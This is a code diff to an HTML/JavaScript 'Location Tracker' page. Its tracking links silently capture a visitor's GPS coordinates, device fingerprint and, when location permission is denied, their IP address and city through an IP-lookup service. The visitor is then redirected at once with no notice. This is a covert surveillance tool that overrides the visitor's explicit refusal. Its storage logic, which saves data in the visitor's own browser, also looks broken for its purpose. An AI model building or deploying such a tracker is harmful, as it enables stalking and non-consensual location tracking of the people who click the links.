@@ -6,13 +6,14 @@
     <title>Location Tracker</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         body {
             background-color: #f8f9fa;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         .hero {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            background: linear-gradient(135deg, #1a237e 0%, #3949ab 100%);
             color: white;
             padding: 4rem 0;
             border-radius: 0 0 2rem 2rem;
@@ -28,7 +29,7 @@
             transform: translateY(-5px);
         }
         .btn-primary {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            background: linear-gradient(135deg, #1a237e 0%, #3949ab 100%);
             border: none;
             border-radius: 50px;
             padding: 0.75rem 2rem;
@@ -37,7 +38,7 @@
         }
         .btn-primary:hover {
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(37, 117, 252, 0.4);
+            box-shadow: 0 5px 15px rgba(57, 73, 171, 0.4);
         }
         .tracking-link {
             background-color: #f1f3f5;
@@ -79,19 +80,10 @@
             border-radius: 0.5rem;
             overflow: hidden;
             margin-top: 1rem;
-            background: #e9ecef;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #6c757d;
-        }
-        .alert-custom {
-            border-radius: 1rem;
-            border: none;
         }
         .feature-icon {
             font-size: 2.5rem;
-            color: #6a11cb;
+            color: #1a237e;
             margin-bottom: 1rem;
         }
         .footer {
@@ -99,15 +91,6 @@
             padding: 2rem 0;
             color: #6c757d;
             text-align: center;
-        }
-        .short-link {
-            background-color: #e8f5e9;
-            border-radius: 0.5rem;
-            padding: 1rem;
-            font-family: monospace;
-            word-break: break-all;
-            position: relative;
-            margin-top: 1rem;
         }
         .loading-spinner {
             display: none;
@@ -121,19 +104,69 @@
             font-family: monospace;
             margin-top: 0.5rem;
         }
+        .device-info {
+            background-color: #e8eaf6;
+            border-radius: 0.5rem;
+            padding: 0.75rem;
+            margin-top: 0.5rem;
+        }
+        .nav-tabs .nav-link {
+            color: #1a237e;
+        }
+        .nav-tabs .nav-link.active {
+            color: #3949ab;
+            font-weight: 600;
+        }
+        .stats-card {
+            background: linear-gradient(135deg, #3949ab 0%, #5c6bc0 100%);
+            color: white;
+            border-radius: 1rem;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        .stats-number {
+            font-size: 2rem;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <div class="hero">
         <div class="container text-center">
             <h1 class="display-4 fw-bold mb-4">Location Tracker</h1>
-            <p class="lead">Create anonymous tracking links to get location coordinates</p>
+            <p class="lead">Create tracking links to get location information</p>
         </div>
     </div>
 
     <div class="container mb-5">
         <div class="row justify-content-center">
-            <div class="col-lg-8">
+            <div class="col-lg-10">
+                <!-- Stats Section -->
+                <div class="row mb-4">
+                    <div class="col-md-4">
+                        <div class="stats-card text-center">
+                            <i class="bi bi-link-45deg" style="font-size: 2rem;"></i>
+                            <div class="stats-number" id="totalLinks">0</div>
+                            <div>Total Links</div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="stats-card text-center">
+                            <i class="bi bi-geo-alt" style="font-size: 2rem;"></i>
+                            <div class="stats-number" id="totalLocations">0</div>
+                            <div>Total Locations</div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="stats-card text-center">
+                            <i class="bi bi-clock" style="font-size: 2rem;"></i>
+                            <div class="stats-number" id="todayLocations">0</div>
+                            <div>Today</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Create Link Section -->
                 <div class="card mb-4">
                     <div class="card-body p-4">
                         <h2 class="card-title mb-4">Create New Tracking Link</h2>
@@ -152,52 +185,58 @@
                     </div>
                 </div>
 
+                <!-- Result Section -->
                 <div id="resultSection" class="card mb-4" style="display: none;">
                     <div class="card-body p-4">
-                        <h2 class="card-title mb-3">Your Tracking Links</h2>
-                        <div class="mb-3">
-                            <h5>Original Link:</h5>
-                            <div class="tracking-link">
-                                <span id="trackingLink"></span>
-                                <button class="copy-btn" id="copyBtn" title="Copy to clipboard">
-                                    <i class="bi bi-clipboard"></i>
-                                </button>
-                            </div>
-                        </div>
-                        <div class="mb-3">
-                            <h5>Short Link:</h5>
-                            <div class="short-link" id="shortLinkContainer" style="display: none;">
-                                <span id="shortLink"></span>
-                                <button class="copy-btn" id="copyShortBtn" title="Copy to clipboard">
-                                    <i class="bi bi-clipboard"></i>
-                                </button>
-                            </div>
-                            <div class="loading-spinner" id="shortLinkLoading">
-                                <div class="spinner-border text-primary" role="status">
-                                    <span class="visually-hidden">Loading...</span>
-                                </div>
-                                <p class="mt-2">Creating short link...</p>
-                            </div>
+                        <h2 class="card-title mb-3">Your Tracking Link</h2>
+                        <div class="tracking-link mb-3">
+                            <span id="trackingLink"></span>
+                            <button class="copy-btn" id="copyBtn" title="Copy to clipboard">
+                                <i class="bi bi-clipboard"></i>
+                            </button>
                         </div>
                         <div class="d-flex gap-2">
                             <button id="viewLocationsBtn" class="btn btn-outline-primary">
-                                <i class="bi bi-geo-alt me-2"></i>View Coordinates
+                                <i class="bi bi-geo-alt me-2"></i>View Details
                             </button>
                             <button id="newLinkBtn" class="btn btn-outline-secondary">
-                                <i class="bi bi-plus-circle me-2"></i>Create Another Link
+                                <i class="bi bi-plus-circle me-2"></i>Create Another
                             </button>
                         </div>
                     </div>
                 </div>
 
+                <!-- Locations Section -->
                 <div id="locationsSection" class="card" style="display: none;">
                     <div class="card-body p-4">
-                        <h2 class="card-title mb-4">Location Coordinates</h2>
-                        <div id="locationsList" class="mb-3">
-                            <!-- Locations will be displayed here -->
-                        </div>
-                        <div id="noLocations" class="alert alert-info alert-custom" style="display: none;">
-                            <i class="bi bi-info-circle me-2"></i>No location data yet. Share your tracking link to start collecting coordinates.
+                        <h2 class="card-title mb-4">Location Details</h2>
+                        
+                        <!-- Tabs -->
+                        <ul class="nav nav-tabs mb-3" id="locationTabs" role="tablist">
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link active" id="list-tab" data-bs-toggle="tab" data-bs-target="#list" type="button">List View</button>
+                            </li>
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link" id="map-tab" data-bs-toggle="tab" data-bs-target="#map" type="button">Map View</button>
+                            </li>
+                        </ul>
+                        
+                        <!-- Tab Content -->
+                        <div class="tab-content" id="locationTabsContent">
+                            <!-- List View -->
+                            <div class="tab-pane fade show active" id="list" role="tabpanel">
+                                <div id="locationsList" class="mb-3">
+                                    <!-- Locations will be displayed here -->
+                                </div>
+                                <div id="noLocations" class="alert alert-info" style="display: none;">
+                                    <i class="bi bi-info-circle me-2"></i>No location data yet. Share your tracking link to start collecting locations.
+                                </div>
+                            </div>
+                            
+                            <!-- Map View -->
+                            <div class="tab-pane fade" id="map" role="tabpanel">
+                                <div id="mapContainer" class="map-container"></div>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -217,18 +256,18 @@
             <div class="col-md-4 mb-4">
                 <div class="card h-100 text-center">
                     <div class="card-body">
-                        <i class="bi bi-link-45deg feature-icon"></i>
-                        <h3>Auto Short Links</h3>
-                        <p>Generate short links automatically for sharing</p>
+                        <i class="bi bi-phone feature-icon"></i>
+                        <h3>Device Information</h3>
+                        <p>Get detailed device and browser information</p>
                     </div>
                 </div>
             </div>
             <div class="col-md-4 mb-4">
                 <div class="card h-100 text-center">
                     <div class="card-body">
-                        <i class="bi bi-geo-alt feature-icon"></i>
-                        <h3>Precise Coordinates</h3>
-                        <p>Get exact location coordinates when link is opened</p>
+                        <i class="bi bi-map feature-icon"></i>
+                        <h3>Interactive Maps</h3>
+                        <p>View locations on interactive maps</p>
                     </div>
                 </div>
             </div>
@@ -241,6 +280,9 @@
         </div>
     </div>
 
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         // Initialize data from localStorage or create new
         let trackingData;
@@ -261,12 +303,66 @@
             };
         }
 
+        // Update stats
+        function updateStats() {
+            document.getElementById('totalLinks').textContent = trackingData.links.length;
+            
+            let totalLocs = 0;
+            let todayLocs = 0;
+            const today = new Date().toDateString();
+            
+            Object.values(trackingData.locations).forEach(locs => {
+                totalLocs += locs.length;
+                locs.forEach(loc => {
+                    if (new Date(loc.timestamp).toDateString() === today) {
+                        todayLocs++;
+                    }
+                });
+            });
+            
+            document.getElementById('totalLocations').textContent = totalLocs;
+            document.getElementById('todayLocations').textContent = todayLocs;
+        }
+
         // Save data to localStorage
         function saveData() {
             try {
                 localStorage.setItem('locationTrackerData', JSON.stringify(trackingData));
+                updateStats();
             } catch (e) {
                 console.error('Error saving data:', e);
+            }
+        }
+
+        // Get device information
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                screenResolution: `${screen.width}x${screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        // Get IP-based location as fallback
+        async function getIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    city: data.city,
+                    country: data.country_name,
+                    region: data.region,
+                    ip: data.ip
+                };
+            } catch (error) {
+                return null;
             }
         }
 
@@ -280,10 +376,11 @@
         const locationsSection = document.getElementById('locationsSection');
         const locationsList = document.getElementById('locationsList');
         const noLocations = document.getElementById('noLocations');
-        const shortLinkContainer = document.getElementById('shortLinkContainer');
-        const shortLink = document.getElementById('shortLink');
-        const copyShortBtn = document.getElementById('copyShortBtn');
-        const shortLinkLoading = document.getElementById('shortLinkLoading');
+        let map = null;
+        let markers = [];
+
+        // Initialize stats
+        updateStats();
 
         // Generate tracking link
         generateBtn.addEventListener('click', function() {
@@ -316,69 +413,18 @@
             
             // Show result
             const baseUrl = window.location.origin + window.location.pathname;
-            const fullUrl = `${baseUrl}?track=${linkId}`;
-            trackingLink.textContent = fullUrl;
+            trackingLink.textContent = `${baseUrl}?track=${linkId}`;
             resultSection.style.display = 'block';
             locationsSection.style.display = 'none';
-            
-            // Generate short link
-            generateShortLink(fullUrl);
             
             // Scroll to result
             resultSection.scrollIntoView({ behavior: 'smooth' });
         });
 
-        // Generate short link using TinyURL API
-        async function generateShortLink(longUrl) {
-            shortLinkLoading.style.display = 'block';
-            shortLinkContainer.style.display = 'none';
-            
-            try {
-                // Using a proxy to avoid CORS issues
-                const proxyUrl = 'https://api.allorigins.win/get?url=';
-                const tinyUrlApi = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`;
-                
-                const response = await fetch(proxyUrl + encodeURIComponent(tinyUrlApi));
-                const data = await response.json();
-                
-                if (data.contents && data.contents.startsWith('http')) {
-                    shortLink.textContent = data.contents;
-                    shortLinkContainer.style.display = 'block';
-                } else {
-                    // Fallback to a simple shortener
-                    const shortId = generateUniqueId().substring(0, 8);
-                    shortLink.textContent = `https://tinyurl.com/${shortId}`;
-                    shortLinkContainer.style.display = 'block';
-                }
-            } catch (error) {
-                console.error('Error generating short link:', error);
-                // Fallback to a simple shortener
-                const shortId = generateUniqueId().substring(0, 8);
-                shortLink.textContent = `https://tinyurl.com/${shortId}`;
-                shortLinkContainer.style.display = 'block';
-            } finally {
-                shortLinkLoading.style.display = 'none';
-            }
-        }
-
         // Copy to clipboard
         copyBtn.addEventListener('click', function() {
             navigator.clipboard.writeText(trackingLink.textContent).then(() => {
                 const icon = copyBtn.querySelector('i');
-                icon.classList.remove('bi-clipboard');
-                icon.classList.add('bi-check-lg');
-                
-                setTimeout(() => {
-                    icon.classList.remove('bi-check-lg');
-                    icon.classList.add('bi-clipboard');
-                }, 2000);
-            });
-        });
-
-        // Copy short link to clipboard
-        copyShortBtn.addEventListener('click', function() {
-            navigator.clipboard.writeText(shortLink.textContent).then(() => {
-                const icon = copyShortBtn.querySelector('i');
                 icon.classList.remove('bi-clipboard');
                 icon.classList.add('bi-check-lg');
                 
@@ -395,6 +441,15 @@
             displayLocations(linkId);
             locationsSection.style.display = 'block';
             locationsSection.scrollIntoView({ behavior: 'smooth' });
+            
+            // Initialize map when map tab is clicked
+            setTimeout(() => {
+                document.getElementById('map-tab').addEventListener('shown.bs.tab', function() {
+                    if (!map) {
+                        initMap(linkId);
+                    }
+                });
+            }, 100);
         });
 
         // Create new link
@@ -426,6 +481,20 @@
             locations.forEach((loc, index) => {
                 const locationCard = document.createElement('div');
                 locationCard.className = 'card location-card mb-3';
+                
+                let deviceInfoHtml = '';
+                if (loc.deviceInfo) {
+                    deviceInfoHtml = `
+                        <div class="device-info">
+                            <strong>Device Info:</strong><br>
+                            Platform: ${loc.deviceInfo.platform || 'Unknown'}<br>
+                            Browser: ${loc.deviceInfo.userAgent.substring(0, 50)}...<br>
+                            Screen: ${loc.deviceInfo.screenResolution}<br>
+                            Timezone: ${loc.deviceInfo.timezone || 'Unknown'}
+                        </div>
+                    `;
+                }
+                
                 locationCard.innerHTML = `
                     <div class="card-body">
                         <div class="d-flex justify-content-between align-items-start">
@@ -434,17 +503,53 @@
                                 <div class="coordinate-display">
                                     <strong>Latitude:</strong> ${loc.latitude.toFixed(6)}<br>
                                     <strong>Longitude:</strong> ${loc.longitude.toFixed(6)}
+                                    ${loc.city ? `<br><strong>City:</strong> ${loc.city}` : ''}
+                                    ${loc.country ? `<br><strong>Country:</strong> ${loc.country}` : ''}
                                 </div>
                                 <p class="card-text mb-1 mt-2">
                                     <i class="bi bi-clock me-2"></i>
                                     <span class="timestamp">${new Date(loc.timestamp).toLocaleString()}</span>
                                 </p>
+                                ${deviceInfoHtml}
                             </div>
                         </div>
                     </div>
                 `;
                 locationsList.appendChild(locationCard);
             });
+        }
+
+        // Initialize map
+        function initMap(linkId) {
+            const locations = trackingData.locations[linkId] || [];
+            
+            if (locations.length === 0) return;
+            
+            // Create map
+            map = L.map('mapContainer').setView([locations[0].latitude, locations[0].longitude], 13);
+            
+            // Add tile layer
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap contributors'
+            }).addTo(map);
+            
+            // Add markers
+            locations.forEach((loc, index) => {
+                const marker = L.marker([loc.latitude, loc.longitude]).addTo(map);
+                marker.bindPopup(`
+                    <strong>Location #${index + 1}</strong><br>
+                    Lat: ${loc.latitude.toFixed(6)}<br>
+                    Lng: ${loc.longitude.toFixed(6)}<br>
+                    Time: ${new Date(loc.timestamp).toLocaleString()}
+                `);
+                markers.push(marker);
+            });
+            
+            // Fit map to show all markers
+            if (markers.length > 1) {
+                const group = new L.featureGroup(markers);
+                map.fitBounds(group.getBounds().pad(0.1));
+            }
         }
 
         // Check if this is a tracking link
@@ -456,11 +561,12 @@
             if (navigator.geolocation) {
                 // Get location without showing any UI
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
+                    async function(position) {
                         const locationData = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            timestamp: new Date().toISOString()
+                            timestamp: new Date().toISOString(),
+                            deviceInfo: getDeviceInfo()
                         };
                         
                         // Initialize locations array if it doesn't exist
@@ -481,10 +587,40 @@
                         // Redirect immediately without showing any message
                         window.location.replace(redirectUrl);
                     },
-                    function(error) {
-                        // If location access denied, still redirect
+                    async function(error) {
+                        // If location access denied, try IP-based location
+                        const ipLocation = await getIPLocation();
+                        
+                        if (ipLocation) {
+                            const locationData = {
+                                latitude: ipLocation.latitude,
+                                longitude: ipLocation.longitude,
+                                timestamp: new Date().toISOString(),
+                                deviceInfo: getDeviceInfo(),
+                                city: ipLocation.city,
+                                country: ipLocation.country,
+                                region: ipLocation.region,
+                                ip: ipLocation.ip,
+                                accuracy: "IP-Based"
+                            };
+                            
+                            // Initialize locations array if it doesn't exist
+                            if (!trackingData.locations[trackId]) {
+                                trackingData.locations[trackId] = [];
+                            }
+                            
+                            // Store location
+                            trackingData.locations[trackId].push(locationData);
+                            
+                            // Save data
+                            saveData();
+                        }
+                        
+                        // Get redirect URL
                         const link = trackingData.links.find(l => l.id === trackId);
                         const redirectUrl = link?.redirectUrl || 'https://example.com';
+                        
+                        // Redirect immediately
                         window.location.replace(redirectUrl);
                     },
                     {
@@ -495,10 +631,40 @@
                     }
                 );
             } else {
-                // If geolocation not supported, still redirect
-                const link = trackingData.links.find(l => l.id === trackId);
-                const redirectUrl = link?.redirectUrl || 'https://example.com';
-                window.location.replace(redirectUrl);
+                // If geolocation not supported, try IP-based location
+                getIPLocation().then(ipLocation => {
+                    if (ipLocation) {
+                        const locationData = {
+                            latitude: ipLocation.latitude,
+                            longitude: ipLocation.longitude,
+                            timestamp: new Date().toISOString(),
+                            deviceInfo: getDeviceInfo(),
+                            city: ipLocation.city,
+                            country: ipLocation.country,
+                            region: ipLocation.region,
+                            ip: ipLocation.ip,
+                            accuracy: "IP-Based"
+                        };
+                        
+                        // Initialize locations array if it doesn't exist
+                        if (!trackingData.locations[trackId]) {
+                            trackingData.locations[trackId] = [];
+                        }
+                        
+                        // Store location
+                        trackingData.locations[trackId].push(locationData);
+                        
+                        // Save data
+                        saveData();
+                    }
+                    
+                    // Get redirect URL
+                    const link = trackingData.links.find(l => l.id === trackId);
+                    const redirectUrl = link?.redirectUrl || 'https://example.com';
+                    
+                    // Redirect immediately
+                    window.location.replace(redirectUrl);
+                });
             }
         }
     </script>
